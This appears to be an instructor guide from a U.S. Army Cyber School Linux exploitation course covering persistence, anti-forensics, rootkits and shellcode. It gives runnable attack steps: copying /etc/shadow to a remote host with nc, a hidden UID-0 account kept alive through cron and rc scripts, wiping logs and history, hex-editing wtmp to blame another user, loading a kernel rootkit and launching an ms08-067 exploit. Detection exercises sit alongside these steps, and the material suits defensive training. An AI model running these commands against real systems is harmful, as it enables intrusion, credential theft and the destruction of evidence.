@@ -1,0 +1,1139 @@
+:doctype: book
+:stylesheet: ../cctc.css
+image::https://git.cybbh.space/global-objects/resources/raw/master/images/cyber-branch-insignia-official.png[Cyber,width=128,float="right"]
+
+U.S. Army Cyber School +
+2017
+
+:numbered!:
+ 
+= Linux Section 5: Exploitation
+
+{empty} +
+
+== Skills and Objectives
+
+{empty} +
+
+.*SKILL 11: Discuss the reasons to establish permanent presence*
+* 11.1 Define permanent presence
+* 11.2 Describe the clean-up process associated with your activity
+* 11.3 Identify indicators and symptoms of compromise
+* 11.4 Develop a methodology for the enumeration of a compromised system
+
+.*SKILL 12: Analyze different types of rootkits and backdoors*
+* 12.1 Discuss and define the main types of backdoors
+* 12.2 Discuss and define the main types of rootkits
+* 12.3 Identify different backdoor persistence techniques
+* 12.4 Describe backdoor communication methods
+* 12.5 Describe methods to detect and mitigate rootkits
+* 12.6 Demonstrate how rootkits can be used to provide false information to a user
+
+.*SKILL 13: Explore Linux Exploitation tools*
+* 13.1 Discuss shell code
+* 13.2 Identify remote shell code execution
+* 13.3 Define credentials
+* 13.4 Perform credential cracking
+* 13.5 Identify purposes for Metasploit
+* 13.6 Identify common Metasploit modules
+* 13.7 Define rainbow tables
+* 13.8 Identify the purposes for custom malware
+* 13.9 Identify zero configuration networking
+
+{empty} +
+
+== Practical Exercises
+
+Each practical exercise is further detailed on Blackboard, to include scenarios, grading, and submission standards.
+
+==== Activity:
+
+
+{empty} +
+
+== Faciliation:
+
+==== Facilitation 11-13
+=== *SKILL 11: Discuss the reasons to establish permanent presence*
+==== 11.1 Define permanent presence
+
+Permanent Presence or perisistence is any mechanism that allows an adversay to maintain access to target system(s) +
+
+Some examples of persistence are scripts placed into the file system that startup at boot/reboot.  Some example file locations: +
+.*init.d scripts / systemd service file*
+
+* Discussed in 4.2
+
+*application startup scripts (bashrc, etc)*
+
+*modifying system binaries*
+
+.*cron*
+* cron runs as a daemon, and waits on temporal events to execute specified actions
+* can run two types of jobs, system(root) and user
+* entries controlled by the /etc/crontab config file
+* crontab binary used to add new cronjobs to crontab file
+
+.*DEMO: Format of crontab*
+----
+* * * * * user command
+crontab -l          #list user cronjobs
+----
+
+.*at*
+* reads a series of commands and executes them at a later time
+* one-time run
+* to persist, must replace itself in a new at command during each iteration
+
+.*inetd/xinetd*
+* known as the 'internet superserver'
+* designed to eliminate the need for multiple idle daemons running in the background, instead centralizing the listening to the inetd (xinetd) +
+daemon who then sends requests to the appropriate server binary +
+
+.*DEMO: inetd conf file*
+----
+apt-get install xinetd                                                  #if not currently installed
+less /etc/xinetd.conf                                                   #show the configuration file
+less /etc/services                                                      #show configured services
+----
+
+
+==== 11.2 Describe the clean-up process associated with your activity
+* A baseline upon connection is required to know what changes have occurred.
+
+* DISCUSSION: Clean-up
+** running processes
+** network connections
+** uploaded binaries removed
+** logs created
+*** which logs can be modified, which can't?
+** account modifications
+** file timestamps
+*** which timestamps can be modified?
+{empty} +
+
+.*DEMO: Cover your tracks*
+{empty} +
+
+Explain to students that every move you make on the system generates some kind of forensic artifact that can be used to tie the attack back to you, the attacker. +
+For this reason, we keep a detailed log of all activities from the time we arive on-box, to the second we break communication with the box. +
+
+Let's first purge as many artifacts as we can from our system ..
+----
+#create new user to be used as bad actor, later on (create now, so no history of it):
+useradd Joe -s /bin/bash -d /home/Joe -p password
+
+#reset box:
+#erase all .bash_history
+for x in $(getent passwd | awk '{print $1}'); do echo "" > /home/$x/.bash_history 2>/dev/null; done
+echo "" > /root/.bash_history
+
+#erase all logs
+i=$(find /var/log -maxdepth 1 -type f -exec echo {} \;)
+for x in $i; do echo "" > $x 2>/dev/null; done
+
+#timestomp all logs:
+y=$(find /var/log/* -exec echo {} \;)
+for x in $y; do touch $x 2>/dev/null; done
+
+#timestomp all binaries
+z=$(find /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -exec echo {} \;)
+for x in $z; do touch $x 2>/dev/null; done
+----
+{empty} +
+
+Now, let's create some atrifacts on our system .. Best to have this setup before demo
+
+----
+#Creating artifacts:
+#you will need 2 linux systems for this, both with floating IPs
+#making sure you are a general user "Joe" without root privs, and with sudo rights
+
+#open at least "2" terminals as user Joe
+
+#type the following command in order (Terminal 1):
+<as user: Joe>
+id                                                                      #shows malicious user what groups he belongs to, and if has sudo rights
+cat /etc/{passwd,shadow,hosts} 2>/dev/null > /tmp/.loot
+which nc
+/bin/nc {IP addy of waiting listener on other box} {random high port} < /tmp/.loot
+CTRL+C
+openssl passwd -1 -salt 1z2y3x4w PassWord1234
+sudo vi /etc/shadow
+sudo useradd -o -l r00t -u 0 -G sudo,shadow,crontab -d /tmp/.home -s /bin/bash -p gotcha
+                                                                        #{-o: non-unique UID (allows us to be UID=0), -l: prevents lastlog and faillog entries 
+                                                                        for user, -u: UID, -G: adds user to additional groups, -d: sets user home directory, 
+                                                                        -s: sets user shell, -p: sets user password}
+su r00t
+password
+nc -lp 12345 > /tmp/.loot/.script.sh
+vi /tmp/.loot/.script.sh
+chown r00t:r00t /tmp/.loot/.script.sh
+chattr +i /tmp/.loot/.script.sh
+#the script below sets a few variables, but essentially assigns both a directory from $(cat list), and a random high port from $C to a python web server
+
+"script.sh":
+
+    #!/bin/bash
+    A=$(ps -elf | grep -v grep | grep Simple | awk '{print $4}')
+    B=$(netstat -anltup | grep -o $A)
+    C=$(od -A n -t d -N 2 /dev/urandom | tr -d ' ')
+    for x in $(cat list); do if [[ $A == $B ]]; then
+        kill -9 $B; 
+        pushd $x; python -m SimpleHTTPServer $C; popd; 
+        sleep 600;
+    done
+
+<as user: r00t>
+chown r00t:r00t /etc/{passwd,shadow}
+chattr +i /etc/{passwd,shadow}
+su root
+PassWord1234
+
+<as root>
+cd /root
+ls
+find ./ -maxdepth 1 -exec zip -r /tmp/.loot/.2.zip {} 2>/dev/null \;
+ls -hs /tmp/.loot
+/bin/nc {IP addy of waiting listener on other box} {random high port} < /tmp/.loot/.2.zip
+exit
+exit
+exit
+
+#On terminal: 2
+nc -lp 54321 > /usr/bin/list                                            #on remote linux box, serve a "list" of directories, as a text doc: list, to netcat listener on port 54321
+chown r00t:r00t /usr/bin/list
+PATH=$PATH:/usr/bin/list
+chattr +i /usr/bin/list
+chattr +i $PATH
+
+echo "SHELL=/bin/bash" >> /var/spool/cron/crontab/r00t
+echo "PATH=$PATH" >> /var/spool/cron/crontab/r00t
+echo "0/5 * * * * /tmp/.loot/.script.sh" >> /var/spool/cron/crontab/r00t
+
+#enter following script: "foothold.sh" into default RC "run-control level" as a START script
+head /etc/inittab                                                       #ID the default run-level of this system
+vi /etc/.foothold.sh
+
+.foothold.sh contents:
+
+    #!/bin/bash
+    A=$(getent passwd | grep -o r00t)
+    B=$(useradd -o -l r00t -u 0 -G sudo,shadow,crontab -d /tmp/.home -s /bin/bash -p gotcha)
+    [[ $A ]] || $B
+    C=$(crontab -u r00t -l)
+    D=$(echo "SHELL=/bin/bash" >> /var/spool/cron/crontab/r00t)
+    E=$(echo "PATH=$PATH" >> /var/spool/cron/crontab/r00t)
+    F=$(echo "0/5 * * * * /tmp/.loot/.script.sh" >> /var/spool/cron/crontab/r00t)
+    G=$($D; $E; $F)
+    [[ $C ]] || $G 
+
+ln -s /etc/.foothold.sh /etc/rc5.d/S013874
+chown r00t:r00t /etc/.foothold.sh
+chattr +i /etc/.foothold.sh
+chattr +i /etc/rc5.d/S013874
+    
+    
+kill -9 $$
+----
+
+OK, we have generated plenty are artifacts to be found on the system ..
+ 
+----
+#most important thing here is to remember that typing "exit" exits our shell calmly, and commits commands entered into the terminal, 
+currently residing in memory, to the user's history.
+
+on Terminal: 1, which exfil'd sensitive data using nc, type "exit" 3x, so our command history is saved to all 3 users history files.
+on Terminal: 2, which pulled in "list", created a cronjob, and a persistence script, foothold.sh, type: "kill -9 $$"; this will kill 
+our session without comiting to the history file.
+----
+{empty} +
+
+Now lets logon as "root" and see if we can figure out just what happened on this system .. +
+1st thing we notice: "root's" password is changed.
+Just for instructional purposes login with root's new password: PassWord1234 (in this case we would normaly boot into recovery mode)
+
+----
+#1st we'll check our own history:
+tail -20 ~/.bash_history
+
+#hmm, seems we only see the history we just created .. this is due to the "kill -9 $$" command entered on Terminal 2.
+#let's check the user's history:
+#1st we'll need a place to start ...
+find /home/* -atime -1 -exec echo {} \;                                 #this will show us non-root user files/dirs accesed in last 24 hrs(1 day)
+
+#now that we know which users last accessed the system, we can begin to dig .. user: Joe was only files affected in /home dir
+
+tail -20 /home/Joe/.bash_history
+#hmm, some interesting artifacts indeed .. nc, vi, openssl, passwd, shadow, r00t, su, etc
+#this bread-crumbs us to the /etc/{passwd,shadow} files, so we look at those next ..
+cat /etc/{passwd,shadow} | grep "Joe\|r00t\|root"
+
+#right off the back we see similiar salts and passwords; we also see that user: r00t is rockin UID=0
+#let's look more into this user: r00t's history:
+tail -20 /home/r00t/.bash_history
+Error: File does not exist
+
+#ok, the plot thinkens .. another look at r00t's passwd entry reveals an odd home directory:  /tmp/.home
+#alternatively, you could just run the following command to verify if a user's home directory exists or not:
+pwkc /etc/passwd | grep "r00t\|Joe"
+tail -20 /tmp/.home/.bash_history
+#hmm, nothing there
+
+#let's dig deeper into the /tmp directroy
+ls -alr /tmp
+
+#ok, some interesting artifacts containing password and DNS data
+#notice we still know nothing about what Joe was doing as user: root .. this is because he killed his shell; no history .. 
+let's see which binaries were last accessed ..
+find /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -maxdepth 1 -atime -1 -exec echo {} \;
+#ok we can see that nc, ls, which, passwd, openssl, etc. binaries were accessed .. this help's us build a picture of what happened here ..
+
+# you might be tempted to just charge in and cat all the logs, but don't ..
+#couple ways we can analyze these logs:
+
+Method 1:
+find /var/log/* -atime -1 -exec echo {} \;                              #unfortunately, because logs are always being generated, this might not help much
+
+Method 2:
+ls -latr /var/log                                                        #this will place the log files in timestamp order assending; last log was last accessed:
+
+
+#let's look into the last couple log files that were accesed/modified, or changed
+tail -20 /var/log/auth.log                                              #this log will only show us authorization or privesc attempts
+                                                                        here we see that user Joe switched to user r00t, then user r00t switched to root
+                                                                                
+tail -20 /var/log/syslog                                                #ok, seems there was a cronjob running from r00t, let's investigate this further
+
+crontab -u r00t -l                                                      #lists contents of r00t's crontab; we see the cronjob that runs a script in /tmp/.loot/.script.sh
+cat /tmp/.loot/.script.sh                                               #ok, so looks like Joe is serving up the contents of $(cat list) as r00t every five minutes
+                                                                        via python web server on random high ports.
+                                                                                
+#let's investigate this further ..
+netstat -atulpn | grep 9999                                             #ok, we can see the connection ok, but we still cannot tell which content is being served.
+
+#using "lsof" we can list open file(s) and narrow down the search via the PID:
+pid=$(ps -elf | grep -v grep | grep -i python | awk '{print $4}')
+dir=$(lsof | grep $pid | grep " cwd ")                                  #in lsof output the entry with "cwd" or "current working directory" specifies what file is open.
+
+#alternatively, we could deduce that since the file $(cat list) is NOT in the directory that "script.sh" runs from, that it is resident in the $PATH
+echo $PATH | tr ':' '\n' | sort
+/bin
+/sbin
+/usr/bin
+/usr/bin/list                                                           # /usr/bin/list !
+/usr/local/bin
+/usr/local/sbin
+/usr/sbin
+
+cat /usr/bin/list                                                       #now we can see exactly what content is being served via python web-server.. or can we?
+Error: permission denied
+ls -al /usr/bin/list
+-rwxrwxr-x 1 r00t r00t 21:39:12 4 /usr/bin/list                         #even root doesn't have permissions to read the contents of this file
+lsattr /usr/bin/list                                                    # a quick look at the file attributes reveals the file is immutable, so we can't delete it either.
+
+----
+
+Just with those history files and logs alone, we were able to paint a picture of what exactly user Joe was attempting on the system, and what data was exfil'd.
+{empty} +
+
+
+There are additional artifacts/indicators that we missed, and that logs, and or history could easily miss .. thankfully the "find" command to the rescue again!
+----
+#to find files whos attributes have changed, we can try this:
+lsattr -R / 2>/dev/null | grep -- "-i-" 2>/dev/null                     #return every file (absolute path) in the system with "immutable" attribute set.
+
+# we can find files that have been accessed, modified, or changed:
+
+for x in {r00t,Joe}; do
+    find / -user "$x" -atime -1 -exec echo {} 2>/dev/null \; ;
+done                                                                    #finds all files, etc owned by users: r00t and/or Joe which have been accessed in last 24 hrs.
+
+# alternatively ..
+
+(find / ! -type l ! -type p -atime -1 -exec ls -al {} 2>/dev/null \; | awk '{print $3}') |  sort | uniq -c | sort -nr 2>/dev/null
+                                                                        #this command returns the user(s) who accessed the most files, sockets, and dirs in the last 24 hrs
+                                                                        takes a bit to finish running, as it is looking at entire system.
+----
+{empty} +
+
+Now let's erase those tracks, to make it much more difficult to detect our actions .. we'll keep this next part confined to the logs +
+since we already covered how to detele/timestomp history, logs, and binaries ..
+
+----
+#let's look at /var/log/auth.log
+ls -latr /var/log | grep auth.log                                        #shows us the last timestamp for this file
+tail -4 /var/log/auth.log                                               #shows us the timestamps for the last entries of the auth.log file
+
+#there seem to be some differences in the two .. the timestamp should be exactly the same as the last log entry in the file ..
+----
+
+----
+EXAMPLE > 
+
+    ls -latr /var/log
+    ..
+    -rw-r-----  1 root              adm           506 May 14 13:07 user.log
+    -rw-rw-r--  1 root              utmp        11520 May 14 18:53 wtmp
+    -rw-r--r--  1 root              root        81110 May 14 19:07 Xorg.0.log
+    -rw-r-----  1 root              adm          8022 May 14 20:45 messages
+    -rw-r-----  1 root              adm          7736 May 14 20:45 kern.log
+    -rw-r-----  1 root              adm         36454 May 14 21:45 dmesg
+    -rw-r-----  1 root              adm         35581 May 14 21:39 auth.log
+    -rw-r-----  1 root              adm         36454 May 14 21:42 syslog
+    -rw-r-----  1 root              adm         51608 May 14 21:42 daemon.log
+
+    tail -3 /var/log/kern.log
+    May 14 20:43:42 deb.kernel [188502.697781] normal operations[8048000+1000]
+    May 14 20:45:01 deb.kernel [188582.011067] application [30709]: segfault at 42424242 ip 42424242 sp bffff4d0 error 4
+    May 14 20:45:47 deb.kernel [188628.234887] application [30714]: segfault at 4242 ip 00004242 sp bffff4d0 error 4 in application [8048000+1000]
+    
+< EXAMPLE
+----
+
+#in the example above we want to remove the BoF entries from the log and adjust the log file's timestamp to reflect that of the last legit entry: normal ops
+
+----
+stat /var/log/kern.log                                                  #gives us all the MAC timestamps for the file
+2017-05-14 21:45:47.443804132 -0400
+2017-05-14 21:45:47.447804174 -0400
+2017-05-14 21:45:47.079842783 -0400
+----
+
+#in order to change the timestamps we need to use the touch -t command..
+
+----
+touch -t 201705142143.42 /var/log/kern.log
+stat /var/log/kern.log                                                  #gives us all the MAC timestamps for the file
+2017-05-14 21:43:42.443804132 -0400
+2017-05-14 21:43:42.447804174 -0400
+2017-05-14 21:48:10.079842783 -0400                                     #we cannot change the "change" timestamp, as it is updated with current time, 
+                                                                        when we ran touch -t
+----
+Or, we can simply clear the kernel ring buffer "dmesg.log" like this:
+
+----
+dmesg --clear dmesg
+----
+
+That's all well and good, but what about binary log files? How do we edit those? +
+
+Recall that `/var/log/wtmp` was also edited ..
+
+----
+file /var/log/wtmp                                                      #shows this file is binary; not ASCII
+cp /var/log/wtmp .x                                                     #cp orig to working copy
+uuencode -m .x x_wtmp > y_wtmp                                          #coverts binary file: ".x" to Base64 (if you wanted to transfer discretely for editing off-box)
+
+uudecode y_wtmp                                                         #converts Base64 to HEX so we can edit it
+who .x                                                                  #show contents of who logged in and when; we need to erase evidence of "Joe"
+----
+
+image::../../resources/images/linux_12_7.png[ttys,height="450",width="350",float="left"]
+
+----
+hexeditor .x                                                            #edit HEX bytes to remove evidence of "Joe", and save it
+----
+note below, the placement of the HEX bytes representing *Joe's* Login info: *3A 30 00 00  4A 6F 65 00* +
+
+image::../../resources/images/linux_12_8.png[Joe,float="left"]
+
+{empty} +
+
+note below, the placement of the HEX bytes representing *root's* Login info: *3A 30 00 00  72 6F 6F 74* +
+
+image::../../resources/images/linux_12_9.png[root,float="left"]
+
+{empty} +
+
+We can use any online converter to verify these findings .. +
+
+image::../../resources/images/linux_12_10.png[root,height="300",width="250",float="left"]
+
+{empty} +
+
+Now it's as easy as modifying the bytes to look like another user was logged in .. +
+we convert "lucy" to HEX to get: 3A 30 00 00 *6C 75 63 79*, and we simply change "Joe" to "lucy"
+
+image::../../resources/images/linux_12_11.png[root,float="left"]
+
+{empty} +
+
+Here is the final output, after saving the altered `/var/log/wtmp` file:
+
+image::../../resources/images/linux_12_12.png[ttys,height="450",width="350",float="left"]
+
+Now when the admin looks in the `/var/log/wtmp` file .. *"lucy" has some splainin to do :)* +
+
+Using this same tactic, we can just as easily alter the timestamps of the binary files as well as ASCII files. +
+
+{empty} +
+
+==== 11.3 Identify indicators and symptoms of compromise
+* DISCUSSION: Possible indicators of compromise
+** Irregular processes running on the system
+** Unusual network connections
+** Gaps in log files
+** Unauthorized user accounts
+** Modified system binaries
+
+==== 11.4 Develop a methodology for the enumeration of a compromised system
+* Develop situational awareness on the compromised system
+* Look at each of the areas of situational awareness on the system for suspicious indicators
+** Processes
+** Network Connections
+** File System
+** Startup
+** Logs/Auditing
+** Accounts
+
+
+=== *SKILL 12: Analyze different types of rootkits and backdoors*
+==== 12.1 Discuss and define the main types of backdoors
+* According to NIST: A backdoor is an undocumented way to gaining access to a computer system<<1>>
+* Would be officially classified as a Remote Access Tool (RAT) depending on package configuration (could be a compromise of legitimate software rather than a separate binary)
+
+.*DISCUSSION: Bind vs reverse*
+* Bind shell:
+** The RAT on the victim machine opens up a listener and waits for an incoming communication.
+** Listener can be bound to a specific port, or it can utilize an interfaces promiscuous mode +
+or a raw_socket to listen for a specific pattern on any port (requires elevated privileges) +
+*laymans terms:* attacker connects from their system to the shell residing on the victim's system, +
+via a port on the nat/firewall which has been binded to the victims server; in this case, a netcat server. +
+{empty} +
+
+image::../../resources/images/linux_5_1.png[bind,height="250",width="450",float="left"]
+
+{empty} +
+
+* Reverse shell:
+** The RAT is preconfigured to call back to a specific location
+** Location can doesn't have to be just an IP and port, could be something like an FQDN or a local broadcast message +
+*laymans terms:* victim's shell connects to a listening service, in this case netcat, on the attacker's system. +
+{empty} +
+
+image::../../resources/images/linux_5_2.png[reverse,height="250",width="450",float="left"]
+
+{empty} +
+
+==== 12.2 Discuss and define the main types of rootkits
+.*DISCUSSION: Kernel vs userspace*
+* User-mode rootkit:
+** Restricted to privileges of user space in which it is executed.
+** Limited in its capacity to hide things from the user, can not hide things from the kernel
+** An example would be replacing the ps binary with a script that uses 'grep -v' to remove entries from ps that it wants to hide from the user
+* Kernel-mode rootkit:
+** Operates in Ring0 space
+** Has full access to the entire system memory
+** Can intercept system calls to truly hide programs, network connections, and files from both the kernel and the user.
+** Often installed as a device driver or a replaced system binary
+{empty} +
+
+.*DEMO: Userspace Rootkit*
+{empty} +
+
+setup the environment using an executable similar to the following: +
+this executable will replace `/usr/bin/subo` binary later on.
+
+----
+#include <stdio.h>
+
+char *secret = "SomeUnGuessablePassword";
+
+int authorization()
+{
+        char password[30];
+        printf("[sudo] password:  ");
+        gets(password);
+        if (!strcmp(password,secret))
+                return 1;
+        else
+                return 0;
+}
+int main()
+{
+        if (authorization())
+        {
+                printf("Command Executed! \n");
+        }
+        else
+        {
+                printf("Sorry, try again. \n");
+        }
+                return 0;
+}
+----
+
+as root:
+
+----
+cp /usr/bin/sudo /root/sudo.bak                                         #this backs up a copy of the sudo binary
+cp /path/to/executable /usr/bin/sudo                                    #this copies our executable over the sudo binary
+----
+
+create a new user and add them to the "sudo" group: +
+
+----
+useradd Dan -G sudo -s /bin/bash
+----
+
+with the executable above compiled, demo the following: +
+
+image::../../resources/images/linux_12_1.png[netstat,height="300",width="750",float="left"]
+
+note that the command: `netstat -p` cannot be run without root privs +
+note to students the groups user: Dan belogs to "sudo" +
+{empty} +
+
+now we are going to run a command to detect userspace rootkit activity: +
+as root, demo the following:
+
+----
+apt-get install -y rkhunter
+
+rkhunter -c | more
+ #or
+rkhunter -c
+ #then 
+cat /var/log/rkhunter.log | grep -i warning
+----
+
+image::../../resources/images/linux_12_2.png[rkhunter]
+
+image::../../resources/images/linux_12_3.png[rkhunter2]
+
+note the warning for file: /usr/bin/sudo 
+{empty} +
+
+.*DEMO: Kernelspace Rootkit*
+{empty} +
+
+setup the environment using a "loadable kernel module": +
+bofore you demo this, cat the output of both the `ps -elf` and `netstat -tualpn` commands to an ASCII file: +
+
+----
+ps -elf > /root/proc.txt && netstat -taulpn >> /root/proc.txt
+----
+
+download and compile the kernel module before required for demonstration: +
+note: only works with: kernels 2.6.x/3.x/4.x +
+
+----
+mkdir /rootkit/ && cd /rootkit
+git clone https://github.com/Dan-P0ul1n/0010100010.git                  #md5 hashes are included in the README
+cd /rootkit/0010100010
+make
+
+        ***  IMPORTANT! ***
+        #make sure you have already copied the process and connection output, as stated above
+        before running the next command.
+        
+insmod r00tk1t.ko                                                       #injects hidden kernel module .. must run as root
+----
+
+This part, you'll demo to students: +
+
+Key Commands: +
+
+----
+kill -60 $PID                                                           #hides/unhides the r00tk1t from lsmod
+kill -31 $PID                                                           #hides/unhides PID from command output
+kill -64 $PID                                                           #gives average user root shell
+mv /file /hidemefile                                                    #prepending "hideme" to files hides from output and useage
+----
+
+----
+ls /rootkit/0010100010                                                  #show them what you are looking for .. files with "r00tk1t" in them
+lsmod | grep -i r00tk1t                                                 #module is hidden .. no output
+ps -elf | grep -i r00tk1t                                               #module is hidden .. no output
+
+ps -elf | grep -v grep | grep sshd                                      #ID SSH service is running; PID
+netstat -atulpn | grep -i :22                                           #shows SSH running, and PID
+
+i=$(ps -elf | grep -v grep | grep sshd | awk '{print $4}')              #sets $i == PID for ssh daemon
+kill -31 $i                                                             #r00tk1t hides the "sshd" process from output via it's PID
+
+#confirm this:
+ps -elf | grep -v grep | grep sshd                                      #we can no longer see the process sshd
+netstat -atlpn | grep -i :22                                            #even though we see it IS running, the process and PID are masked from output
+netstat -atlp | grep -i ssh                                             #even though we see it IS running, the process and PID are masked from output
+cd /proc/$i                                                             #even though we cannot see the output in ps command, it still exists in /proc
+
+#there are couple ways we can be certain we are in the right place ..
+
+#three files which accompany most binary processes:  "comm", "cmdline", and "exe"
+
+cat /proc/$i/comm
+sshd
+
+cat /proc/$i/cmdline
+/usr/sbin/sshd
+
+md5sum /proc/$i/exe
+34f1b693ca545bb354dab7a525fdfbfb  ./exe
+md5sum /usr/sbin/sshd
+34f1b693ca545bb354dab7a525fdfbfb  /usr/sbin/sshd                        #perfect match!
+
+#additionally we can see the socket associated with the sshd process:
+
+cat /proc/$i/net/tcp                                                    #even though the r00tk1t has masked the PID from command output, we can still 
+                                                                        see the PID here
+cat /proc/net/tcp                                                       #  .. or here, alternatively
+ls -al /proc/$i/fd                                                      #here is the file creating our socket (ID via PID from above output)
+----                  
+
+This is how you can read the /proc/net/tcp file: +
+
+image::../../resources/images/linux_12_6.png[proc_net,float="left"]
+{empty} +
+
+Ask students: feeling pretty confident? +
+
+image::../../resources/images/linux_12_4.png[r00tk1t,height="200",width="200",float="left"]
+{empty} +
+
+Now we really complicate things .. +
+
+----
+find /bin -maxdepth 1 -type f -name "netstat"  #finds the netstat binary
+/bin/netstat
+
+mv /bin/netstat /bin/hidemenetstat                                      #this hides the binary (prepends "hideme" to filename), and now we can no longer 
+                                                                        run netstat commands ..
+netstat -atulpn
+bash: netstat: command not found
+
+#thankfully we can still look to make sure "ssh" is running by grepping for the ssh-agent:
+ps -elf | grep -v grep | grep -i ssh
+
+find /bin -maxdepth 1 -type f -name "ssh-agent"                         #here we can still see the "ssh-agent" binary ..
+/usr/bin/ssh-agent
+
+mv /usr/bin/ssh-agent /usr/bin/hidemessh-agent                          #hides "ssh-agent" binary from all command output (happening in memory with the system call)
+find /bin -maxdepth 1 -type f -name "ssh-agent"                         #looks for and confirms binary cannot be found ..
+bash: ssh-agent: command not found
+
+ps -elf | grep -v grep | grep -i ssh                                    #i still see the ssh-agent service :)
+
+find /bin -maxdepth 1 -type f -name "ps"                                #here we can still see the "ps" binary ..
+/bin/ps
+
+mv /bin/ps /bin/hidemeps                                                # $#!@ just got real!
+ps -elf | grep -v grep | grep -i ssh                                    #confirms "ps" bianry is hidden from command output ..
+bash: ps: command not found                                             
+
+#you could literally just run the following command, and hand someone a "bad day":
+for x in {ps,netstat,lsof,top,lsmod,ls,df}; do mv /bin/$x /bin/hideme$x; done
+----
+
+image::../../resources/images/linux_12_5.png[battleship,height="200",width="350",float="left"]
+{empty} +
+
+This is a good time to stress the importance of baselining ones system to the students.
+
+
+to remove the kernel module (once it's visible again): +
+
+----
+kill -60 $i                     #makes kernel module visible again
+lsmod | grep -i r00tk1t         #verifies the kernel module is visible and ready for removal
+
+rmmod r00tk1t                   #removes the kernel module
+
+        *** verify it's gone ***
+        
+lsmod | grep -i r00tk1t         #verifies the kernel module was removed
+netstat -tlp                    #verifies binaries have reverted
+----
+{empty} +
+{empty} +
+
+
+Now, if you had a decent knowledge of assembly, how to use gdb, and a baseline of the original syscall table, +
+you could track down the syscalls in memory .. and compare the baselined ones against the ones currently residing in memory +
+resulting in the binaries that have been intercepted by the kernel r00tk1t.
+
+.*DEMO: View syscall files*
+----
+cat /usr/include/syscall.h | more                                       #this file location can be different
+cat /usr/include/unistd.h | more                                        #function numbers for syscalls may also be in this file
+cat /boot/system.map* | more                                            #this could be a different name, contains memory locations
+----
+
+http://www.digilife.be/quickreferences/qrc/linux%20system%20call%20quick%20reference.pdf
+
+
+==== 12.3 Identify different backdoor persistence techniques *(see rootkits demo above)*
+* DISCUSSION: How to persist
+** startup scripts: rc#.d scripts or *.service files                    
+** binary replacement - overwrite legit binary
+** cronjob
+** inetd
+
+==== 12.4 Describe backdoor communication methods
+.*Communication Channels*
+* Overt:
+** Typical communication methods (sockets)
+** No attempt to blend with other traffic
+* Covert:
+** RAT utilizes stealth in an attempt to blend in with legitimate traffic
+** Can pose as actual http/ssl traffic using port 80/443 for example
+** Also can try to hide messages within protocols not typically utilized for message transport, ie ICMP, DNS
+** Can include using timing channels to send coded messages based on the time between signals as opposed to the signal itself (ie. ping, wait 3 seconds, ping)
+
+==== 12.5 Describe methods to detect and mitigate rootkits *(see rootkits demo above)*
+* DISCUSSION: vetting for malware
+** Look at running processes
+** Upload known good tools - check hashes of local tools
+** Look for analgous network traffic/listening ports
+** compare /proc against shown processes
+** check hashes of system binaries in virustotal
+
+==== 12.6 Demonstrate how rootkits can be used to provide false information to a user *(see rootkits demo above)*
+.*DISCUSSION: How can a root kit intercept system calls*
+* Syscall table
+** All kernel system calls are defined in a table which indexes the syscall code to a memory location
+** system calls function numbers are typically contained in the syscall.h or unistd.h files
+** The default memory locations for system calls is typically contained in the /boot/system.map file (system.map name may include an architecture)
+
+* Loadable Kernel Modules (LKM):
+** Contain code that extends the running kernel without the need to recompile
+** Often used to include device drivers and additional system calls
+** execute in kernel space
+** Often used by rootkits to change syscall function pointers to their own wrapper function which hides information from the user
+
+
+=== *SKILL 13: Explore Linux Exploitation tools*
+==== 13.1 Discuss shell code
+* DISCUSSION: Shell code is a small piece of code used as the payload in the exploitation of software.  Often utilized as part of a buffer overflow attack.  Goal of the attack is to point the programs instruction pointer (ip) at the memory space in which the shell code resides.
+
+
+----
+msfvenom --help
+
+Options:
+    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
+        --payload-options            List the payload's standard options
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
+    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
+    -f, --format        <format>     Output format (use --help-formats for a list)
+        --help-formats               List available formats
+    -e, --encoder       <encoder>    The encoder to use
+    -a, --arch          <arch>       The architecture to use
+        --platform      <platform>   The platform of the payload
+    -s, --space         <length>     The maximum size of the resulting payload
+        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
+    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
+    -i, --iterations    <count>      The number of times to encode the payload
+    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
+    -x, --template      <path>       Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -o, --out           <path>       Save the payload
+    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
+        --smallest                   Generate the smallest possible payload
+    -h, --help                       Show this message
+
+
+msfvenom -l encoders                                                    #lists all available encoders
+----
+
+#open this ms08_067 exploit and show students the NOP sled at the front of the shellcode:
+https://www.exploit-db.com/exploits/40279/
+
+{empty} +
+
+==== 13.2 Identify remote shell code execution
+* DISCUSSION: Indicators of remote shell code execution include network traffic or logs containing large numbers of a constant character to discover buffer overflows.  Could also be long strings of 90s (indicating NOP codes) followed by random hex characters.
+
+.*DEMO: ID remote shell code execution*
+{empty} +
+
+#there are many ways to generate shell code, but we will stick to using "msfvenom" .. first lets see the simplicity of it .. +
+
+#good idea to restart the Win XP box to reset listening named PIPE .. +
+
+----
+wget https://raw.githubusercontent.com/3mrgnc3/pentest_old/master/ms08-067-nc.py
+
+vi ./ms-067-067-nc.py                                               #show students the various "key parts" of the payload; particularly note the shellcode and the nop generator
+
+usage:
+python ms08-067-nc.py {target IP} 1 {source IP} {listening port}
+----
+
+#now we run the attack and catch it with tcpdump: +
+
+image::../../resources/images/linux_13_1.png[tcpdump,height="70",width="450",float="left"]
+
+image::../../resources/images/linux_13_2.png[ms08067,height="250",width="450",float="left"]
+{empty} +
+
+#run a few commands {tasklist,systeminfo, dir /a} on the returned windows shell to generate additional traffic we will ID in pcap .. +
+
+----
+wireshark ms08_067.pcap                                             #ignore LUA warning
+----
+
+#search for packet string, case sensitive: PIPE, until you find "PIPE/browser" .. this will be more relevent when we get into metasploit .. +
+
+image::../../resources/images/linux_13_3.png[PIPE,height="250",width="650",float="left"]
+
+image::../../resources/images/linux_13_4.png[PIPE2,height="150",width="300",float="left"]
+{empty} +
+
+#search for the commands we ran: tasklist, systeminfo, etc . . follow TCP stream and see the plaintext traffic that was generated.
+
